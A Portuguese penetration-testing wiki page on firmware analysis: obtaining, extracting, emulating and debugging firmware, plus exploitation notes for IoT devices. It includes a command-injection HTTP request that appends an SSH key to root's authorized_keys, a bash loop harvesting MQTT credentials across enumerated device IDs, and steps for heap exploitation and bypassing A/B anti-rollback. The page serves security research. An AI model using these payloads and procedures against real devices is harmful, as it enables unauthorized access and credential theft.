# Análise de Firmware

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Introdução**

### Recursos relacionados

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

O firmware é um software essencial que permite que os dispositivos funcionem corretamente, gerenciando e facilitando a comunicação entre os componentes de hardware e o software com o qual os usuários interagem. Ele é armazenado em memória permanente, garantindo que o dispositivo possa acessar instruções essenciais desde o momento em que é ligado, o que leva à inicialização do sistema operacional. Examinar e potencialmente modificar o firmware é uma etapa fundamental para identificar vulnerabilidades de segurança.<sup>[[2]](#references)[[3]](#references)</sup>

## **Coleta de informações**

A **coleta de informações** é uma etapa inicial fundamental para compreender a composição de um dispositivo e as tecnologias que ele utiliza. Esse processo envolve coletar dados sobre:

- A arquitetura da CPU e o sistema operacional que ela executa
- Detalhes do bootloader
- Layout do hardware e datasheets
- Métricas da base de código e locais do código-fonte
- Bibliotecas externas e tipos de licença
- Histórico de atualizações e certificações regulatórias
- Diagramas de arquitetura e fluxo
- Avaliações de segurança e vulnerabilidades identificadas

Para isso, ferramentas de **open-source intelligence (OSINT)** são inestimáveis, assim como a análise de quaisquer componentes de software open source disponíveis, por meio de processos de revisão manuais e automatizados. Ferramentas como [Coverity Scan](https://scan.coverity.com) e [Semmle’s LGTM](https://lgtm.com/#explore) oferecem análise estática gratuita que pode ser utilizada para encontrar possíveis problemas.

## **Obtenção do firmware**

A obtenção do firmware pode ser feita de várias maneiras, cada uma com seu próprio nível de complexidade:

- Diretamente da fonte (desenvolvedores, fabricantes)
- Compilando-o com base nas instruções fornecidas
- Baixando-o de sites oficiais de suporte
- Utilizando consultas **Google dork** para encontrar arquivos de firmware hospedados
- Acessando diretamente o **armazenamento em nuvem**, com ferramentas como [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Interceptando **atualizações** por meio de técnicas man-in-the-middle
- Extraindo-o do dispositivo por meio de conexões como **UART**, **JTAG** ou **PICit**
- Fazendo **sniffing** das solicitações de atualização na comunicação do dispositivo
- Identificando e usando **endpoints de atualização hardcoded**
- Fazendo **Dumping** do bootloader ou da rede
- **Removendo e lendo** o chip de armazenamento, quando nada mais funciona, usando ferramentas de hardware apropriadas

### Logs apenas via UART: force um root shell por meio do ambiente U-Boot na flash

Se o RX da UART for ignorado (apenas logs), ainda é possível forçar um shell de init **editando offline o blob do ambiente U-Boot**:<sup>[[6]](#references)</sup>

1. Faça o dump da SPI flash com um clipe SOIC-8 e um programador (3.3V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Localize a partição env do U-Boot, edite `bootargs` para incluir `init=/bin/sh` e **recalcule o CRC32 do U-Boot env** para o blob.
3. Regrave apenas a partição env e reinicie; um shell deverá aparecer na UART.

Isso é útil em dispositivos embarcados nos quais o shell do bootloader está desativado, mas a partição env pode ser gravada por meio de acesso externo à flash.

## Analisando o firmware

Agora que você **tem o firmware**, precisa extrair informações sobre ele para saber como lidar com ele. Algumas ferramentas que você pode usar para isso:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Se não encontrar muita coisa com essas ferramentas, verifique a **entropia** da imagem com `binwalk -E <bin>`; se a entropia for baixa, é improvável que ela esteja criptografada. Se for alta, provavelmente está criptografada (ou comprimida de alguma forma).

Além disso, você pode usar estas ferramentas para extrair **arquivos incorporados no firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ou [**binvis.io**](https://binvis.io/#/) ([código](https://code.google.com/archive/p/binvis/)) para inspecionar o arquivo.

### Obtendo o sistema de arquivos

Com as ferramentas mencionadas anteriormente, como `binwalk -ev <bin>`, você deve conseguir **extrair o sistema de arquivos**.\
O Binwalk geralmente o extrai em uma **pasta com o nome do tipo de sistema de arquivos**, que costuma ser um dos seguintes: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extração manual do sistema de arquivos

Às vezes, o binwalk **não tem os bytes mágicos do sistema de arquivos nas assinaturas**. Nesses casos, use o binwalk para **encontrar o offset do sistema de arquivos e fazer carving do sistema de arquivos comprimido** a partir do binário e **extrair manualmente** o sistema de arquivos de acordo com seu tipo, seguindo as etapas abaixo.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Execute o seguinte **dd command** para fazer o carving do sistema de arquivos Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativamente, também seria possível executar o seguinte comando.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Para squashfs (usado no exemplo acima)

`$ unsquashfs dir.squashfs`

Os arquivos estarão no diretório "`squashfs-root`" depois disso.

- Arquivos de arquivo CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Para sistemas de arquivos jffs2

`$ jefferson rootfsfile.jffs2`

- Para sistemas de arquivos ubifs com flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analisando o firmware

Depois de obter o firmware, é essencial dissecá-lo para entender sua estrutura e possíveis vulnerabilidades. Esse processo envolve o uso de várias ferramentas para analisar e extrair dados valiosos da imagem do firmware.

### Ferramentas de análise inicial

Um conjunto de comandos é fornecido para a inspeção inicial do arquivo binário (referido como `<bin>`). Esses comandos ajudam a identificar tipos de arquivo, extrair strings, analisar dados binários e entender os detalhes das partições e do sistema de arquivos:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Para avaliar o status da criptografia da imagem, verifica-se a **entropia** com `binwalk -E <bin>`. Entropia baixa sugere ausência de criptografia, enquanto entropia alta indica possível criptografia ou compressão.

Para extrair **arquivos incorporados**, recomendam-se ferramentas e recursos como a documentação **file-data-carving-recovery-tools** e o **binvis.io** para inspecionar arquivos.

### Extraindo o sistema de arquivos

Com `binwalk -ev <bin>`, geralmente é possível extrair o sistema de arquivos, muitas vezes para um diretório com o nome do tipo de sistema de arquivos (por exemplo, squashfs, ubifs). No entanto, quando o **binwalk** não reconhece o tipo de sistema de arquivos devido à ausência de magic bytes, é necessário fazer a extração manualmente. Isso envolve usar o `binwalk` para localizar o offset do sistema de arquivos e, em seguida, o comando `dd` para extrair esse conteúdo:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Depois, dependendo do tipo de sistema de arquivos (por exemplo, squashfs, cpio, jffs2, ubifs), são usados diferentes comandos para extrair manualmente o conteúdo.

### Análise do sistema de arquivos

Com o sistema de arquivos extraído, começa a busca por falhas de segurança. A atenção é direcionada a daemons de rede inseguros, credenciais hardcoded, endpoints de API, funcionalidades do servidor de atualização, código não compilado, scripts de inicialização e binários compilados para análise offline.

**Locais principais** e **itens** a inspecionar incluem:

- **etc/shadow** e **etc/passwd** em busca de credenciais de usuário
- Certificados e chaves SSL em **etc/ssl**
- Arquivos de configuração e scripts em busca de possíveis vulnerabilidades
- Binários embarcados para análise adicional
- Servidores web e binários comuns de dispositivos IoT

Várias ferramentas ajudam a encontrar informações confidenciais e vulnerabilidades no sistema de arquivos:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) e [**Firmwalker**](https://github.com/craigz28/firmwalker) para buscar informações confidenciais
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) para análise abrangente de firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) e [**EMBA**](https://github.com/e-m-b-a/emba) para análise estática e dinâmica

### Verificações de segurança em binários compilados

Tanto o código-fonte quanto os binários compilados encontrados no sistema de arquivos devem ser examinados em busca de vulnerabilidades. Ferramentas como **checksec.sh** para binários Unix e **PESecurity** para binários Windows ajudam a identificar binários desprotegidos que podem ser explorados.

## Coleta de configurações de cloud e credenciais MQTT por meio de tokens de URL derivados

Muitos hubs IoT buscam sua configuração específica por dispositivo em um endpoint de cloud semelhante a:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Durante a análise de firmware, você pode descobrir que `<token>` é derivado localmente do ID do dispositivo usando um segredo hardcoded, por exemplo:

- token = MD5( deviceId || STATIC_KEY ) e representado como hexadecimal em maiúsculas

Esse design permite que qualquer pessoa que descubra um deviceId e o STATIC_KEY reconstrua a URL e obtenha a configuração de cloud, revelando com frequência credenciais MQTT em texto simples e prefixos de tópicos.

Fluxo de trabalho prático:

1) Extraia o deviceId dos logs de inicialização UART

- Conecte um adaptador UART de 3,3 V (TX/RX/GND) e capture os logs:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Procure linhas que imprimam o padrão de URL de configuração da cloud e o endereço do broker, por exemplo:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Recupere STATIC_KEY e o algoritmo do token a partir do firmware

- Carregue os binários no Ghidra/radare2 e pesquise o caminho de configuração ("/pf/") ou o uso de MD5.
- Confirme o algoritmo (por exemplo, MD5(deviceId||STATIC_KEY)).
- Derive o token no Bash e converta o digest para maiúsculas:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Coletar configuração da nuvem e credenciais MQTT

- Monte a URL e obtenha o JSON com curl; analise-o com jq para extrair os segredos:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Abuse MQTT em texto simples e ACLs fracas para tópicos (se presentes)

- Use as credenciais recuperadas para se inscrever em tópicos de manutenção e procurar eventos confidenciais:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Enumerar IDs de dispositivos previsíveis (em escala, com autorização)

- Muitos ecossistemas incorporam bytes de OUI/produto/tipo do fabricante, seguidos de um sufixo sequencial.
- Você pode iterar por IDs candidatos, derivar tokens e buscar configurações programaticamente:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notas
- Sempre obtenha autorização explícita antes de tentar fazer enumeração em massa.
- Quando possível, prefira emulação ou análise estática para recuperar secrets sem modificar o hardware-alvo.


O processo de emular firmware possibilita a **análise dinâmica** da operação de um dispositivo ou de um programa específico. Essa abordagem pode encontrar desafios relacionados a dependências de hardware ou arquitetura, mas transferir o sistema de arquivos raiz ou binários específicos para um dispositivo com arquitetura e endianness correspondentes, como um Raspberry Pi, ou para uma máquina virtual pré-configurada, pode facilitar testes adicionais.

### Emulando binários individuais

Para examinar programas isolados, é crucial identificar o endianness e a arquitetura de CPU do programa.

#### Exemplo com arquitetura MIPS

Para emular um binário com arquitetura MIPS, use o comando:

```bash
file ./squashfs-root/bin/busybox
```

E para instalar as ferramentas de emulação necessárias:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Para MIPS (big-endian), usa-se `qemu-mips`; para binários little-endian, a escolha seria `qemu-mipsel`.

#### Emulação da arquitetura ARM

Para binários ARM, o processo é semelhante, utilizando o emulador `qemu-arm` para a emulação.

### Emulação completa do sistema

Ferramentas como [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) e outras facilitam a emulação completa do firmware, automatizando o processo e auxiliando na análise dinâmica.

### Reconstrução de sistemas de arquivos root divididos e verificados para emulação

Se um superbloco SquashFS puder ser lido, mas os offsets das tabelas de inode, diretório ou fragmentos forem impossíveis, não corrija imediatamente o `unsquashfs`. Faça engenharia reversa do binário de inicialização inicial e reproduza o grafo de dispositivos de bloco que ele cria: sistemas embarcados podem expor uma partição root nominal, mas construir o sistema de arquivos real com um mapeamento `dm-linear` que acrescenta setores emprestados de outra partição. As verificações que usam apenas o superbloco podem ter sucesso mesmo quando todos os blocos de metadados posteriores estão deslocados.<sup>[[9]](#references)</sup>

Preserve exatamente a aritmética do firmware. Em particular, identifique se os comprimentos estão em bytes, setores de 512 bytes ou páginas de 4 KiB; reproduza os deslocamentos de bits e o truncamento na ordem original; e leve em conta as regiões finais dependentes do banco em layouts A/B. Por exemplo, `(partition_bytes >> 12) << 3` primeiro trunca para um limite de 4 KiB e só depois expressa o resultado em setores de 512 bytes; substituí-lo por `partition_bytes // 512` pode deslocar a extensão acrescentada em alguns quilobytes e corromper todas as tabelas SquashFS subsequentes.<sup>[[9]](#references)</sup>

Um fluxo de validação útil é:<sup>[[9]](#references)</sup>

1. Recupere do binário de verificação/init o dispositivo de origem, o setor inicial e o comprimento de cada segmento `dm-linear`.
2. Concatene ou mapeie as extensões sem alterar a semântica de alinhamento.
3. Se a extração ainda falhar, pesquise apenas uma pequena janela ao redor do limite previsto e exija várias estruturas de metadados válidas consecutivas, em vez de aceitar apenas um superbloco plausível.
4. Execute um `unsquashfs` sem modificações na imagem reconstruída; a travessia bem-sucedida de todos os diretórios e fragmentos é uma evidência mais forte do que `unsquashfs -stat`.

#### Substituição do dm-verity controlada pelo analista

Quando o analista controla o kernel QEMU, o initramfs e os discos virtuais, é possível inicializar um root modificado substituindo o PID 1 de verificação do fornecedor por um init pequeno, compilado estaticamente. Isso é uma **substituição da cadeia de boot em laboratório**, não uma quebra do dm-verity, da assinatura RSA, do Secure Boot ou de uma chave selada por TPM.<sup>[[9]](#references)</sup>

O init substituto deve espelhar as etapas operacionais do caminho de inicialização original: montar `devtmpfs`, chamar `setsid()`, conectar `/dev/console` aos descritores de arquivo 0–2, montar `/proc` e `/sys`, aguardar o dispositivo de bloco fornecido, montar o root editado em modo somente leitura, desanexar os pseudossistemas de arquivos do root antigo, mover a nova montagem para `/`, executar `chroot` e, então, `execve()` o `/sbin/init` original do firmware. Desanexar `/dev`, `/proc` e `/sys` **antes** de `MS_MOVE` evita desanexar acidentalmente pontos de montagem pertencentes ao novo root.<sup>[[9]](#references)</sup>

Mantenha o estado mutável do dispositivo separado do root imutável modificado. Uma sobreposição qcow2 pode preservar o estado LVM do disco original, enquanto um segundo disco virtio somente leitura fornece o SquashFS editado:<sup>[[9]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Depuração offline do estado da imagem

Inspecione o estado persistente fora do guest quando inicializações lentas, scripts destrutivos de inicialização ou logs de console não confiáveis dificultarem a identificação da falha. Nunca conecte um overlay em uso por uma VM em execução; exponha-o com `qemu-nbd`, restrinja a descoberta do LVM à partição NBD pretendida e desative o grupo de volumes antes de desconectá-lo.<sup>[[9]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Para isolar falhas de forma reproduzível, grave arquivos marcador com timestamp em um volume gravável estável e verifique-os offline; `/dev/kmsg`, FIFOs e consoles temporários podem gerar falsos negativos devido ao rate limiting ou à interrupção prematura do processo. Compare também as interfaces exatas entre camadas antes de alterar código não relacionado: `uname -r` versus `/lib/modules/`, recursos do ext4 no disco versus configuração do kernel e geração do `libGL` do Mesa versus ABI do driver DRI e nomes de drivers derivados do PCI. Um componente pode existir e até carregar com sucesso via `dlopen()`, mas continuar inutilizável porque o consumidor espera uma ABI diferente.<sup>[[9]](#references)</sup>

## Análise dinâmica na prática

Nesta etapa, usa-se um ambiente de dispositivo real ou emulado para análise. É essencial manter acesso ao shell do SO e ao filesystem. A emulação pode não reproduzir perfeitamente as interações com o hardware, exigindo reinicializações ocasionais do ambiente emulado. A análise deve voltar a examinar o filesystem, explorar páginas da Web expostas e serviços de rede e investigar vulnerabilidades do bootloader. Testes de integridade do firmware são essenciais para identificar possíveis vulnerabilidades de backdoor.

## Técnicas de análise em tempo de execução

A análise em tempo de execução envolve interagir com um processo ou binário no ambiente em que é executado, usando ferramentas como gdb-multiarch, Frida e Ghidra para definir breakpoints e identificar vulnerabilidades por meio de fuzzing e outras técnicas.

Para alvos embarcados sem um debugger completo, **copie um `gdbserver` estaticamente vinculado** para o dispositivo e conecte-se remotamente:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Mapeamento de mensagens Zigbee / co-processador de rádio

Em hubs IoT, a stack RF costuma ser dividida entre um **MCU de rádio** e um processo em espaço de usuário Linux. Um fluxo de trabalho útil é mapear o caminho:<sup>[[8]](#references)</sup>

1. **Quadro RF** transmitido pelo ar
2. **Parser do lado do controlador** no MCU de rádio
3. **Protocolo de texto serial/UART ou TLV** encaminhado ao Linux (por exemplo, `/dev/tty*`)
4. **Despachante da aplicação** no daemon principal
5. **Handler específico do protocolo / máquina de estados**

Essa arquitetura cria dois alvos de engenharia reversa em vez de um. Se o controlador converter quadros de rádio binários em um protocolo textual como `Group,Command,arg1,arg2,...`, descubra:

- Os **grupos de mensagens** e as tabelas de despacho
- Quais mensagens podem vir da **rede** e quais vêm do próprio controlador
- Os campos discriminadores exatos **específicos do fabricante** (por exemplo, Zigbee `manufacturer_code` e `cluster_command` personalizado)
- Quais handlers só podem ser alcançados durante as fases de **commissioning**, descoberta ou download de firmware/modelo

Especificamente para Zigbee, capture o tráfego de pareamento e verifique se o alvo ainda depende da **Link Key** padrão `ZigBeeAlliance09`. Nesse caso, farejar o tráfego de commissioning pode expor a **Network Key**. Os códigos de instalação do Zigbee 3.0 reduzem essa exposição; portanto, observe se o dispositivo testado realmente os exige.

### Handlers de protocolo específicos do fabricante e alcançabilidade controlada por FSM

Comandos Zigbee/ZCL específicos do fabricante costumam ser alvos melhores do que clusters padronizados, pois alimentam **código de parsing personalizado** e **FSMs** internas com validação menos testada em campo.<sup>[[8]](#references)</sup>

Fluxo de trabalho prático:

- Faça engenharia reversa do despachante de comandos até encontrar o **handler exclusivo do fabricante**.
- Recupere as tabelas de **estado da FSM**, **evento**, **verificação**, **ação** e **próximo estado**.
- Identifique **estados de transição** que avançam automaticamente e ramificações de retry/erro que acabam redefinindo ou liberando estado controlado pelo atacante.
- Confirme quais trocas legítimas de protocolo são necessárias para colocar o daemon no estado vulnerável, em vez de presumir que o handler vulnerável está sempre acessível.

Para protocolos sensíveis ao tempo, o replay de pacotes com um framework Python pode ser lento demais. Uma abordagem mais confiável é emular um dispositivo legítimo em hardware real (por exemplo, um **nRF52840**) com uma stack de nível industrial para expor os **endpoints**, **atributos** e o timing de commissioning corretos.

### Classe de bugs em downloads fragmentados em daemons embarcados

Uma classe recorrente de bugs de firmware aparece em downloads **fragmentados de blobs/modelos/configurações**:<sup>[[8]](#references)</sup>

1. O **primeiro fragmento** (`offset == 0`) armazena `ctx->total_size` e aloca `malloc(total_size)`.
2. Os fragmentos seguintes validam apenas campos **locais ao pacote** controlados pelo atacante, como `packet_total_size >= offset + chunk_len`.
3. A cópia usa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sem verificar se está dentro do **tamanho alocado originalmente**.

Isso permite que um atacante envie:

- Um primeiro fragmento válido com um tamanho total declarado **pequeno** para forçar uma alocação pequena no heap.
- Um fragmento posterior com o **offset esperado**, mas um `chunk_len` maior.
- Um tamanho local ao pacote falsificado que satisfaça as verificações recentes e ainda transborde o buffer alocado originalmente.

Quando o caminho vulnerável está por trás da lógica de commissioning, a exploração precisa incluir **emulação de dispositivo** suficiente para levar o alvo ao estado esperado de download de modelo ou blob antes de enviar os fragmentos malformados.

### Gatilhos de `free()` acionados pelo protocolo

Em daemons embarcados, a maneira mais fácil de acionar a exploração de metadados do heap muitas vezes não é "esperar pela limpeza", mas **forçar o próprio tratamento de erros do protocolo**:<sup>[[8]](#references)</sup>

- Envie fragmentos subsequentes malformados para levar a FSM a estados de **retry** ou **erro**.
- Exceda o limite de retries para que o daemon **redefina o contexto** e libere o buffer corrompido.
- Use esse `free()` previsível para acionar primitivas do alocador antes que o processo trave por motivos não relacionados.

Isso é especialmente útil contra alocadores **musl/uClibc/dlmalloc-like** em Linux embarcado, nos quais a corrupção de metadados de chunks pode transformar a lógica de unlink/unbin em uma primitiva de escrita. Um padrão estável é corromper um **campo de tamanho** para redirecionar a travessia do alocador para **chunks falsos preparados dentro do buffer transbordado**, em vez de sobrescrever imediatamente ponteiros reais de bins e travar o processo.

## Exploração Binária e Prova de Conceito

Desenvolver um PoC para vulnerabilidades identificadas exige um entendimento profundo da arquitetura do alvo e programação em linguagens de baixo nível. Proteções de runtime binário são raras em sistemas embarcados, mas, quando presentes, técnicas como Return Oriented Programming (ROP) podem ser necessárias.

### Notas sobre exploração de fastbin em uClibc (Linux embarcado)

- **Fastbins + consolidação:** uClibc usa fastbins semelhantes aos do glibc. Uma alocação grande posterior pode acionar `__malloc_consolidate()`, então qualquer chunk falso precisa passar pelas verificações (tamanho válido, `fd = 0` e chunks adjacentes considerados "em uso").<sup>[[6]](#references)</sup>
- **Binários non-PIE com ASLR:** se o ASLR estiver habilitado, mas o binário principal for **non-PIE**, os endereços de `.data/.bss` dentro do binário são estáveis. É possível direcionar uma região que já se pareça com um cabeçalho válido de chunk do heap para fazer uma alocação fastbin cair em uma **tabela de ponteiros de função**.
- **NUL que interrompe o parser:** quando o JSON é analisado, um `\x00` no payload pode interromper o parsing e preservar bytes controlados pelo atacante no final para um pivot de stack/cadeia ROP.
- **Shellcode via `/proc/self/mem`:** uma cadeia ROP que chama `open("/proc/self/mem")`, `lseek()` e `write()` pode gravar shellcode executável em um mapeamento conhecido e saltar para ele.

## Sistemas Operacionais Preparados para Análise de Firmware

Sistemas operacionais como [AttifyOS](https://github.com/adi0x90/attifyos) e [EmbedOS](https://github.com/scriptingxss/EmbedOS) oferecem ambientes pré-configurados para testes de segurança de firmware, equipados com as ferramentas necessárias.

## Sistemas Operacionais Preparados para Analisar Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS é uma distribuição destinada a ajudar na avaliação de segurança e em testes de penetração de dispositivos da Internet das Coisas (IoT). Ela economiza bastante tempo ao fornecer um ambiente pré-configurado com todas as ferramentas necessárias instaladas.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): sistema operacional para testes de segurança embarcada baseado no Ubuntu 18.04, pré-carregado com ferramentas para testes de segurança de firmware.

## Ataques de Downgrade de Firmware e Mecanismos de Atualização Inseguros

Mesmo quando um fabricante implementa verificações de assinatura criptográfica para imagens de firmware, a **proteção contra reversão de versão (downgrade)** costuma ser omitida. Quando o bootloader ou o carregador de recuperação verifica apenas a assinatura com uma chave pública incorporada, mas não compara a *versão* (ou um contador monotônico) da imagem sendo gravada, um atacante pode instalar legitimamente um **firmware mais antigo e vulnerável que ainda tenha uma assinatura válida**, reintroduzindo assim vulnerabilidades corrigidas.<sup>[[4]](#references)</sup>

Fluxo de ataque típico:

1. **Obtenha uma imagem antiga assinada**
   * Baixe-a do portal público de downloads, CDN ou site de suporte do fabricante.
   * Extraia-a de aplicativos móveis/de desktop associados (por exemplo, de `assets/firmware/` dentro de um APK Android).
   * Obtenha-a em repositórios de terceiros, como VirusTotal, arquivos da Internet, fóruns etc.
2. **Envie ou disponibilize a imagem ao dispositivo** por qualquer canal de atualização exposto:
   * Interface web, API de aplicativo móvel, USB, TFTP, MQTT etc.
   * Muitos dispositivos IoT de consumo expõem endpoints HTTP(S) *sem autenticação* que aceitam blobs de firmware codificados em Base64, decodificam-nos no servidor e acionam a recuperação/atualização.
3. Após o downgrade, explore uma vulnerabilidade corrigida em uma versão mais recente (por exemplo, um filtro contra command injection que foi adicionado posteriormente).
4. Opcionalmente, grave novamente a imagem mais recente ou desabilite as atualizações para evitar detecção depois de obter persistência.

### Exemplo: Command Injection após Downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

No firmware vulnerável (com downgrade), o parâmetro `md5` é concatenado diretamente em um comando shell sem sanitização, permitindo a injeção de comandos arbitrários (neste caso, habilitando o acesso root por chave SSH). Versões posteriores do firmware introduziram um filtro básico de caracteres, mas a ausência de proteção contra downgrade torna a correção inócua.<sup>[[4]](#references)</sup>

### Extraindo firmware de aplicativos móveis

Muitos fornecedores incluem imagens completas de firmware em seus aplicativos móveis complementares para que o app possa atualizar o dispositivo via Bluetooth/Wi-Fi. Esses pacotes geralmente são armazenados sem criptografia no APK/APEX, em caminhos como `assets/fw/` ou `res/raw/`. Ferramentas como `apktool`, `ghidra` ou até mesmo o `unzip` permitem extrair imagens assinadas sem tocar no hardware físico.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Bypass de anti-rollback somente no updater em designs com slots A/B

Alguns fornecedores implementam um **ratchet** anti-downgrade, mas apenas na lógica do *updater* (por exemplo, uma rotina UDS via CAN, um comando de recuperação ou um agente OTA em userspace). Se o **bootloader** verificar depois apenas a assinatura/CRC da imagem e confiar na tabela de partições ou nos metadados do slot, ainda será possível burlar a proteção contra rollback.<sup>[[7]](#references)</sup>

Design fraco típico:

- Os metadados do firmware contêm um descritor de versão e um **ratchet de segurança** / contador monotônico.
- O updater compara o ratchet da imagem com um valor armazenado em armazenamento persistente e rejeita imagens assinadas mais antigas.
- O bootloader **não** analisa esse ratchet e apenas verifica o cabeçalho, o CRC e a assinatura antes de inicializar o slot selecionado.
- A ativação do slot é armazenada separadamente em uma tabela de partições ou em um contador de geração por slot e **não está vinculada criptograficamente** ao digest exato do firmware validado.

Isso cria uma primitiva de **validar uma imagem / inicializar outra** em sistemas de slot duplo. Se o atacante conseguir fazer o updater marcar o slot B como próximo destino de inicialização usando uma imagem assinada atual e depois sobrescrever o slot B antes da reinicialização, o bootloader ainda poderá inicializar a imagem com downgrade, pois confia apenas nos metadados do slot já confirmados.

Padrão comum de exploração:

1. Carregue um firmware **atual e assinado** no slot passivo e execute a rotina normal de validação/troca para que o layout marque esse slot como o próximo ativo.
2. **Não reinicie ainda**. Reentre na rotina de preparação/apagamento do slot na mesma sessão.
3. Explore a lógica obsoleta de estado de inicialização ou de seleção de slot para que o updater apague o **mesmo slot físico** que acabou de promover.
4. Grave um firmware **mais antigo, mas ainda assinado**, nesse slot.
5. Ignore a rotina de validação que aplica o ratchet e reinicie diretamente.
6. O bootloader seleciona o slot promovido, verifica apenas a assinatura/integridade e inicializa a imagem antiga.

O que procurar ao fazer reverse engineering de implementações de atualização A/B:

- Seleção de slot derivada de **flags de inicialização** que não são atualizadas após uma troca bem-sucedida.
- Uma rotina no estilo `prepare_passive_slot()` que apaga um slot com base em estado obsoleto, em vez do **layout confirmado atual**.
- Uma função no estilo `part_write_layout()` que apenas incrementa um **contador de geração** / flag de slot ativo e não armazena o hash da imagem validada.
- Verificações do ratchet implementadas em userspace ou no código do updater, mas **não** na ROM / no bootloader / nas etapas de secure boot.
